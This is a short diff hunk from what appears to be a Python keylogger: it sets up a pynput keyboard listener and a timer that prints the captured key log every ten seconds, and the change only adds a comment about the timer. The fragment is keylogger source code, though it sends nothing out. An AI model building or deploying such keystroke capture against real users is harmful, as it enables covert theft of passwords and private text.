@@ -25,7 +25,7 @@ def report():
     global log
     print(log)
     log = ""
-    timer = threading.Timer(10, report)
+    timer = threading.Timer(10, report) #recursive function - report calls itself
     timer.start()
     
 keyboard_listener = pynput.keyboard.Listener(on_press = process_keypress)
